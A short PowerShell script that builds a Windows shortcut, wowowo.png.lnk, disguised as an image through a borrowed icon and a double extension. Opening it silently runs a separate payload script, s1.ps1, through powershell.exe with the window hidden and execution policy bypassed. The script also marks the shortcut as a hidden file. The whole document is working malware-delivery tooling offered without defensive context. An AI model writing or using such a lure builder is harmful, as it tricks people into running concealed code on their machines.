# language: PowerShell, file: build_wowowo.ps1, target: Windows 10/11
# Creates wowowo.png.lnk that runs s1.ps1, icon = wowowo.ico, window = hidden.

param(
    [string]$Image   = ".\wowowo.png",
    [string]$Payload = "s1.ps1",
    [string]$Out     = ".\wowowo.png.lnk"
)

$dir  = (Resolve-Path (Split-Path -Parent $Image)).Path
$ico  = Join-Path $dir "wowowo.ico"
if (-not (Test-Path $ico)) { $ico = (Resolve-Path $Image).Path }   # fallback: png as icon

$lnkPath = Join-Path $dir $Out
$ps      = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"

$ws  = New-Object -ComObject WScript.Shell
$lnk = $ws.CreateShortcut($lnkPath)
$lnk.TargetPath       = $ps
$lnk.Arguments        = "-NoP -NonI -W Hidden -Exec Bypass -File `"$Payload`""
$lnk.WorkingDirectory = $dir
$lnk.IconLocation     = "$ico,0"
$lnk.WindowStyle      = 7               # minimized
$lnk.Description      = ""
$lnk.Save()

# make the lnk itself look like a system/thumbnail asset
(Get-Item $lnkPath).Attributes = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::Archive

Write-Host "wrote  $lnkPath"
Write-Host "icon   $ico"
Write-Host "target $ps $($lnk.Arguments)"
